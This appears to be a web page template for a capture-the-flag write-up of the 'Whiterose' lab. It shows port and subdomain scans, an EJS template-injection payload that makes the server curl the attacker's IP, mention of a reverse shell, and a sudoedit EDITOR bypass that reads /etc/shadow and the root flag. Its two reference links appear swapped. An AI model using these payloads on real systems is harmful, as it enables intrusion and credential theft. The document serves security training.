{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We begin by performing a port scan.")}}

{{console("nmap -T5 -p- 10.10.103.231", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-09 10:19 EST
Warning: 10.10.103.231 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.103.231
Host is up (0.086s latency).
Not shown: 65151 closed tcp ports (reset), 382 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 300.50 seconds")}}

{{text("Only two ports are open:")}}

{{list(['22 (SSH)', '80 (HTTP)'])}}

{{text("Navigating to <code class='bg-gray-300 rounded-md px-1'>http://10.10.103.231</code> redirects to <code class='bg-gray-300 rounded-md px-1'>http://cyprusbank.thm</code>, so we add an entry for this domain in the <code class='bg-gray-300 rounded-md px-1'>/etc/hosts</code> file.") }}

{{text("Now, visiting <code class='bg-gray-300 rounded-md px-1'>http://cyprusbank.thm</code> displays the following page.")}}

{{image("../../static/writeups/whiterose/images/000001.jpg")}}

{{text("Running Gobuster for directory enumeration reveals no additional directories, so we proceed with subdomain enumeration.")}}

{{console("ffuf -u 'http://cyprusbank.thm/' -H 'Host: FUZZ.cyprusbank.thm' -w /usr/share/wordlists/dirb/common.txt -fw 1", "...
Admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 107ms]
ADMIN                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 106ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 107ms]
www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 73ms]
:: Progress: [4614/4614] :: Job [1/1] :: 531 req/sec :: Duration: [0:00:12] :: Errors: 0 ::") }}

{{text("Adding the subdomains <code class='bg-gray-300 rounded-md px-1'>www</code> and <code class='bg-gray-300 rounded-md px-1'>admin</code> to our hosts file, we find that only <code class='bg-gray-300 rounded-md px-1'>admin</code> leads to something interesting.")}}

{{image("../../static/writeups/Whiterose/images/000003.jpg")}}

{{header("Logging in as Olivia Cortez", "logging-in-as-olivia-cortez")}}

{{text("Using the credentials <code class='bg-gray-300 rounded-md px-1'>Olivia Cortez:olivi8</code> provided in the challenge, we log in successfully.")}}

{{text("The dashboard displays recent transactions and user accounts, including a user named <code class='bg-gray-300 rounded-md px-1'>Tyrell Wellick</code>, whose phone number is required.")}}

{{image("../../static/writeups/whiterose/images/000004.jpg")}}

{{text("Unable to retrieve relevant information from <code class='bg-gray-300 rounded-md px-1'>search</code> and lacking permissions for <code class='bg-gray-300 rounded-md px-1'>settings</code>, we proceed to <code class='bg-gray-300 rounded-md px-1'>messages</code>.")}}

{{header("Logging in as Gayle Bev", "logging-in-as-gayle-bev")}}

{{text("The messages page is an administrator message board.")}}

{{image("../../static/writeups/whiterose/images/000005.jpg")}}

{{text("Though the messages contain nothing useful, we notice a URL parameter <code class='bg-gray-300 rounded-md px-1'>c</code> that might allow us to do something.")}}

{{text("Posting a new message removes the previous one, so we can assume this parameter is used to control how many messages get displayed. Adjusting <code class='bg-gray-300 rounded-md px-1'>c=5</code> to <code class='bg-gray-300 rounded-md px-1'>c=100</code> displays prior messages.")}}

{{image("../../static/writeups/whiterose/images/000006.jpg")}}

{{text("This reveals new credentials <code class='bg-gray-300 rounded-md px-1'>Gayle Bev:[REDACTED]</code>, which grant us access to <code class='bg-gray-300 rounded-md px-1'>Tyrell Wellick's</code> phone number, marking the first flag.")}}

{{header("Reverse Shell", "reverse-shell")}}

{{text("Navigating further, we now have access to the <code class='bg-gray-300 rounded-md px-1'>settings</code> page.")}}

{{image("../../static/writeups/whiterose/images/000007.jpg")}}

{{text("On the settings page, we find an interface for changing passwords by username. Initial SQL injection attempts fail, but error messages in <strong>Burp</strong> indicate the use of the <strong>EJS</strong> templating engine.")}}

{{image("../../static/writeups/whiterose/images/000008.jpg")}}

{{text("We explore potential server-side template injection (<strong>SSTI</strong>) vulnerabilities in EJS, guided by an article.")}}

{{link("https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis", "https://www.vicarius.io/vsociety/favicon.svg", "CVE-2023-22809: Sudoedit Bypass - Analysis")}}

{{text("Using a crafted payload, <code class='bg-gray-300 rounded-md px-1'>name=test&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 10.9.2.82');s</code>, we confirm SSTI exploitation.")}}

{{image("../../static/writeups/whiterose/images/000009.jpg")}}

{{text("Our next objective is to gain a reverse shell.")}}

{{text("After trying several reverse shell payloads from <code class='bg-gray-300 rounded-md px-1'>revshells.com</code>, a base64-encoded BusyBox reverse shell proves successful.")}}

{{text("Setting up a netcat listener, we execute the payload through bash to gain shell access.")}}

{{header("Privilage Escalation", "priv-esc")}}

{{image("../../static/writeups/whiterose/images/000010.jpg")}}

{{text("With shell access, we stabilize the connection for smoother navigation.")}}

{{image("../../static/writeups/whiterose/images/000011.jpg")}}

{{text("Inside <code class='bg-gray-300 rounded-md px-1'>/home/web</code>, we retrieve the <code class='bg-gray-300 rounded-md px-1'>user.txt</code> flag.")}}

{{image("../../static/writeups/whiterose/images/000012.jpg")}}

{{text("While looking around for privilage escalation vectors, we run <code class='bg-gray-300 rounded-md px-1'>sudo -l</code> and see that we are able to run <code class='bg-gray-300 rounded-md px-1'>sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm</code> as the root user.")}}

{{text("We can't find anything about <code class='bg-gray-300 rounded-md px-1'>sudoedit</code> on <code class='bg-gray-300 rounded-md px-1'>https://gtfobins.github.io/</code>, but we come across this article.")}}

{{link("https://github.com/mde/ejs/issues/720", "https://github.com/favicon.ico", "EJS, Server side template injection ejs@3.1.9")}}

{{text("By using <code class='bg-gray-300 rounded-md px-1'>export EDITOR='vi -- /etc/shadow'</code> we will make <code class='bg-gray-300 rounded-md px-1'>vi</code> open the <code class='bg-gray-300 rounded-md px-1'>/etc/shadow</code> file when <code class='bg-gray-300 rounded-md px-1'>sudoedit</code> is used.")}}

{{text("We now run <code class='bg-gray-300 rounded-md px-1'>sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm</code> and are able to read the <code class='bg-gray-300 rounded-md px-1'>/etc/shadow</code>")}}

{{console("sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm", "root:[REDACTED]
daemon:*:18885:0:99999:7:::
bin:*:18885:0:99999:7:::
sys:*:18885:0:99999:7:::
...")}}

{{text("Let's modify the <strong>export</strong> to read our flag.")}}

{{text("By using <code class='bg-gray-300 rounded-md px-1'>export EDITOR='vi -- /root/root.txt'</code> and re-running the command, we should be able to read our flag.")}}

{{console("sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm", "THM{[REDACTED]}
~                                                                               
~                                                                               
~                                                                               
...")}}

{{script()}}

